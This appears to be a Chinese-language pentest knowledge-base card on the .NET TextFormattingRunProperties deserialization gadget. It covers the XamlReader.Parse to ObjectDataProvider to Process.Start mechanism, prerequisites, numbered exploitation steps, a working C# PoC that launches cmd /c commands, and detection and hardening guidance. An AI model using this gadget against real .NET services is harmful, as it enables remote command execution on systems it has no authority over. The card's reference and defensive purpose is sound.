---
id: web-dotnet-deser-textformattingrunproperties-xamlreader-odp-gadget
title: TextFormattingRunProperties gadget：ForegroundBrush 存 XAML，反序列化构造函数经 XamlReader.Parse 触发 ObjectDataProvider 命令执行
type: scenario
domain: web
path: web/dotnet/deserialization
technique: textformattingrunproperties-foregroundbrush-xamlreader-odp
aliases:
- TextFormattingRunProperties
- TFRP gadget
- ForegroundBrush XAML
- Microsoft.PowerShell.Editor.dll
- XamlReader.Parse gadget
- ObjectDataProvider Process Start
- ysoserial TextFormattingRunProperties
tags:
- dotnet
- binaryformatter
- deserialization
- textformattingrunproperties
- xamlreader
- objectdataprovider
- wpf
- gadget
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V670
  verified_at: '2026-11-13T10:13:22+08:00'
  notes: 已对照原文与 img02 调试栈核对 ForegroundBrush→XamlReader.Parse→ObjectDataProvider→Process.Start 机制、Microsoft.PowerShell.Editor.dll 依赖与 ISerializable 生成代码；未实际执行（未验证点：依赖程序集在目标机是否可用）。
---

## 一句话结论

`Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties`（位于 Microsoft.PowerShell.Editor.dll）实现 `ISerializable`，攻击者用 `info.SetType(TextFormattingRunProperties)` 并给 `ForegroundBrush` 字段写入 XAML 字符串，BinaryFormatter 反序列化时该类型的反序列化构造函数会对 `ForegroundBrush` 调用 `XamlReader.Parse`，解析其中的 `ObjectDataProvider` 执行 `Process.Start`，是最经典的 .NET 反序列化外层 gadget 之一。

## 原理

- **载体类型**：`TextFormattingRunProperties` 是一个"格式化文本属性"类，实现了 `ISerializable` 自定义序列化。攻击者不需要实例化真实对象，只需实现一个 `ISerializable` 包装类，在 `GetObjectData` 里 `info.SetType(typeof(TextFormattingRunProperties))`，并 `info.AddValue("ForegroundBrush", <XAML 字符串>)`。
- **反序列化侧行为**：BinaryFormatter 按 `SetType` 记录的类型创建 `TextFormattingRunProperties`，调用其反序列化构造函数；构造函数内部 `GetObjectFromSerializationInfo` 取出 `ForegroundBrush` 的值并调用 `XamlReader.Parse(payload)`。文章的调试栈（img02）显示：`new TextFormattingRunProperties()` → `XamlReader.Load` → `WpfXamlLoader.Load/TransformNodes` → `XamlObjectWriter` → `ObjectDataProvider.QueryWorker` → `ObjectDataProvider.InvokeMethodOnInstance` → `RuntimeMethodInfo.Invoke`，即反序列化过程直接走到了任意方法调用。
- **XAML payload**：`ObjectDataProvider` 设 `MethodName="Start"`、`ObjectInstance` 为 `System.Diagnostics.Process`、`ProcessStartInfo.FileName=cmd`、`Arguments=/c <命令>`；也可用 `ResourceDictionary` 包裹 `ObjectDataProvider`（`ObjectType="{d:Type c:Process}"`）。`XamlWriter.Save(ObjectDataProvider)` 可直接生成该 XAML。
- **依赖条件**：需要目标进程能加载 `Microsoft.PowerShell.Editor.dll`（Microsoft.VisualStudio.Text.Formatting 所在程序集）。文章指出该程序集是 PowerShell 的一部分，从 Windows Server 2008 R2 / Windows 7 起随系统预装；装过 PowerShell ISE/Visual Studio 的机器通常具备。
- **为什么是"通用外层"**：很多反序列化入口（DataSet.Tables_0、ToolboxItemContainer.Stream、AxHost.State.PropertyBagBinary、ClaimsIdentity 等）最终都需要一个 BinaryFormatter 可消费的内层 gadget；TFRP 凭"一个字符串字段即可承载任意 XAML"成为最常用的内层/外层载荷。文章还指出 `ObjectDataProvider` 不能直接放进 LosFormatter，但 TFRP 可以经 LosFormatter/ObjectStateFormatter 的 BinaryFormatter token 承载。
- **成功标志**：命令在反序列化进程（如 w3wp.exe 应用池）身份下执行；文章用 `cmd /c calc` 弹计算器验证。

## 触发条件

- 存在 BinaryFormatter（或 LosFormatter/ObjectStateFormatter 等带 BinaryFormatter token 的格式）反序列化入口，且序列化流可控。
- 目标进程可加载 Microsoft.PowerShell.Editor.dll（Microsoft.VisualStudio.Text.Formatting）。
- 反序列化端没有类型白名单，或黑名单未覆盖 TextFormattingRunProperties。

## 利用步骤

1. 生成 XAML：用 `ProcessStartInfo`（cmd.exe + `/c <命令>`）构造 `ObjectDataProvider`（`MethodName=Start`、`IsInitialLoadEnabled=false`、`ObjectInstance=Process`），再用 `XamlWriter.Save` 序列化成字符串。
2. 实现 `ISerializable` 包装类：`info.SetType(typeof(TextFormattingRunProperties))`，`info.AddValue("ForegroundBrush", xaml)`。
3. 用 `BinaryFormatter.Serialize` 得到恶意字节流，投递到反序列化入口；若入口为 LosFormatter/ObjectStateFormatter，按对应格式包装（见关联卡）。
4. 命令在目标进程执行，用弹计算器/DNSLog/回显验证。

## PoC

```csharp
[Serializable]
public class TextFormattingRunPropertiesMarshal : ISerializable
{
    private readonly string _xaml;
    public TextFormattingRunPropertiesMarshal(string cmd) { _xaml = Gadget(cmd); }

    public static string Gadget(string cmd)
    {
        ProcessStartInfo psi = new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c " + cmd };
        StringDictionary dict = new StringDictionary();
        psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic)
           .SetValue(psi, dict);
        Process p = new Process { StartInfo = psi };
        ObjectDataProvider odp = new ObjectDataProvider {
            MethodName = "Start", IsInitialLoadEnabled = false, ObjectInstance = p
        };
        return XamlWriter.Save(odp);
    }

    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        info.SetType(typeof(Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties));
        info.AddValue("ForegroundBrush", _xaml);
    }
}

// 投递
var bf = new BinaryFormatter();
using (var ms = new MemoryStream())
{
    bf.Serialize(ms, new TextFormattingRunPropertiesMarshal("calc"));
    ms.Position = 0;
    bf.Deserialize(ms); // 触发 XamlReader.Parse -> Process.Start
}
```

## 变体与关联

- 变体：XAML 内容可换成 `ResourceDictionary` + `ObjectDataProvider`（用于先关闭 `DisableActivitySurrogateSelectorTypeCheck` 等辅助操作，见关联卡）。
- 变体：内层承载目标可换成自定义程序集加载（ActivitySurrogateSelector）、TypeConfuseDelegate 等；TFRP 只负责把字符串送进 `XamlReader.Parse`。
- 关联：[[web-dotnet-deser-viewstate-machinekey-textformattingrunproperties]]（TFRP 经 MachineKey 伪造 ViewState 的入口场景）、[[web-dotnet-deser-activitysurrogateselector-disable-typecheck-bypass]]（TFRP 承载关闭类型检查的 XAML）、[[web-dotnet-deser-dataset-serializationinfo-tables-binaryformatter-readxml-xmlserializer]]、[[web-dotnet-deser-toolboxitemcontainer-stream-field-binaryformatter]]、[[web-dotnet-deser-losformatter-objectstateformatter-claims-identity-second-order]]（均以 TFRP 为内层载荷的二段载体）。
- 边界：目标缺少 Microsoft.PowerShell.Editor.dll 时该 gadget 不可用，需要换 TypeConfuseDelegate（.NET 4.5+）等替代。

## 检测与防御

- 检测：序列化流中出现 `TextFormattingRunProperties`、`Microsoft.PowerShell.Editor`、`XamlReader`、`ObjectDataProvider` 等类型名；进程出现 `XamlReader.Parse`/`WpfXamlLoader` 调用栈后派生 `cmd.exe`/`powershell.exe`。
- 修复：禁用 `BinaryFormatter`（AppContext 开关或代码移除），改用 DataContract/JSON 等安全序列化；对反序列化入口实施 `SerializationBinder` 类型白名单。
- 加固：服务端进程不需要 WPF/PowerShell 编辑器程序集时移除相关组件；升级 .NET Framework；WAF/EDR 检测含 `TextFormattingRunProperties` 的序列化流。
